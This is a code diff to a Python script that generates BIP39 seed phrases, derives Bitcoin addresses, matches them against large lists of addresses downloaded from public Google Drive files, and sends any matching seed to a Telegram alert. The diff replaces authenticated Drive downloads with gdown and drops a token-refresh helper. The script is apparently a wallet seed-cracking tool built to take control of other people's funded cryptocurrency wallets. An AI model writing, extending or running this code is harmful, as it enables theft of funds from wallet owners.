@@ -3,7 +3,6 @@
 
 import os
 import sys
-import io
 import json
 import time
 import signal
@@ -12,6 +11,7 @@ import subprocess
 import logging
 import urllib.request
 import urllib.parse
+import gdown
 from mnemonic import Mnemonic
 from bip_utils import (
     Bip39SeedGenerator,
@@ -20,26 +20,13 @@ from bip_utils import (
     Bip44Changes,
     Bip49,
     Bip49Coins,
-    Bip49Changes,
     Bip84,
     Bip84Coins,
-    Bip84Changes,
     Bip44Conf,
 )
-from google.oauth2.credentials import Credentials
-from googleapiclient.discovery import build
-from googleapiclient.http import MediaIoBaseDownload
 from supabase import create_client
 
 Bip44Conf.ENABLE_UNSAFE_HDWALLET = True
-
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-
-try:
-    from test_drive import refresh_and_update_token
-except Exception as _e:
-    refresh_and_update_token = None
-    print(f"WARNING: Could not import test_drive: {_e}")
 
 BTC_FILE_ID = "1rysnhDGWd6OxtqbjHy-UEiDt6VDBsbAI"
 ETH_FILE_ID = "1G9CCyNnDoTxvQhqdQxYkbPG-HV2WN-Fx"
@@ -208,36 +195,22 @@ def send_telegram_alert(coin, seed, address, extra=None):
     return ok
 
 
-def get_drive_service():
-    token = os.getenv("DRIVE_TOKEN")
-    if not token:
-        raise RuntimeError("DRIVE_TOKEN is not set (test_drive refresh may have failed)")
-    token_info = json.loads(token)
-    creds = Credentials.from_authorized_user_info(
-        info=token_info,
-        scopes=["https://www.googleapis.com/auth/drive.file"]
-    )
-    return build("drive", "v3", credentials=creds)
-
-
-def download_drive_file(service, file_id, local_path, label):
+def download_public_drive_file(file_id, local_path, label):
     if os.path.exists(local_path) and os.path.getsize(local_path) > 0:
         print(f"{label} already present ({os.path.getsize(local_path)/(1024*1024):.1f} MB), skipping download.")
         return local_path
 
     print(f"Downloading {label} ...")
-    request = service.files().get_media(fileId=file_id)
-    with open(local_path, "wb") as f:
-        downloader = MediaIoBaseDownload(f, request)
-        done = False
-        last_pct = 0
-        while not done:
-            status, done = downloader.next_chunk()
-            if status:
-                pct = int(status.progress() * 100)
-                if pct >= last_pct + 10:
-                    print(f"  ...{pct}%")
-                    last_pct = pct
+    try:
+        gdown.download(id=file_id, output=local_path, quiet=False)
+    except Exception as e:
+        print(f"ERROR downloading {label}: {e}")
+        return None
+
+    if not os.path.exists(local_path) or os.path.getsize(local_path) == 0:
+        print(f"ERROR: {label} download produced no file (is it shared publicly?)")
+        return None
+
     size_mb = os.path.getsize(local_path) / (1024 * 1024)
     print(f"  {label} downloaded ({size_mb:.1f} MB)")
     return local_path
@@ -260,7 +233,7 @@ def derive_btc_addresses(seed_phrase):
 
     try:
         addr = Bip49.FromSeed(seed_bytes, Bip49Coins.BITCOIN) \
-            .Purpose().Coin().Account(0).Change(Bip49Changes.CHAIN_EXT) \
+            .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT) \
             .AddressIndex(0).PublicKey().ToAddress()
         results.append(("p2sh", addr))
     except Exception:
@@ -268,7 +241,7 @@ def derive_btc_addresses(seed_phrase):
 
     try:
         addr = Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN) \
-            .Purpose().Coin().Account(0).Change(Bip84Changes.CHAIN_EXT) \
+            .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT) \
             .AddressIndex(0).PublicKey().ToAddress()
         results.append(("bech32", addr))
     except Exception:
@@ -475,26 +448,18 @@ def main():
         print("ERROR: atomic table has no row with id=1. Run the SQL setup first.")
         sys.exit(1)
 
-    if refresh_and_update_token is not None:
-        try:
-            print("Refreshing Google Drive token...")
-            refresh_and_update_token()
-            print("Token refreshed and saved to DB.")
-        except Exception as e:
-            print(f"WARNING: Token refresh failed: {e}")
-    else:
-        print("WARNING: test_drive module unavailable; skipping token refresh.")
-
     load_telegram_config()
 
     if not ensure_valid_seeds():
         print("ERROR: could not produce valid_seeds.txt. Exiting.")
         sys.exit(1)
 
-    service = get_drive_service()
-    download_drive_file(service, BTC_FILE_ID, BTC_TXT, "BTC addresses")
-    download_drive_file(service, ETH_FILE_ID, ETH_TXT, "ETH addresses")
-    download_drive_file(service, SOL_FILE_ID, SOL_TXT, "SOL addresses")
+    if not download_public_drive_file(BTC_FILE_ID, BTC_TXT, "BTC addresses"):
+        sys.exit(1)
+    if not download_public_drive_file(ETH_FILE_ID, ETH_TXT, "ETH addresses"):
+        sys.exit(1)
+    if not download_public_drive_file(SOL_FILE_ID, SOL_TXT, "SOL addresses"):
+        sys.exit(1)
 
     build_sqlite_from_txt(BTC_TXT, BTC_DB, "BTC")
     build_sqlite_from_txt(ETH_TXT, ETH_DB, "ETH")
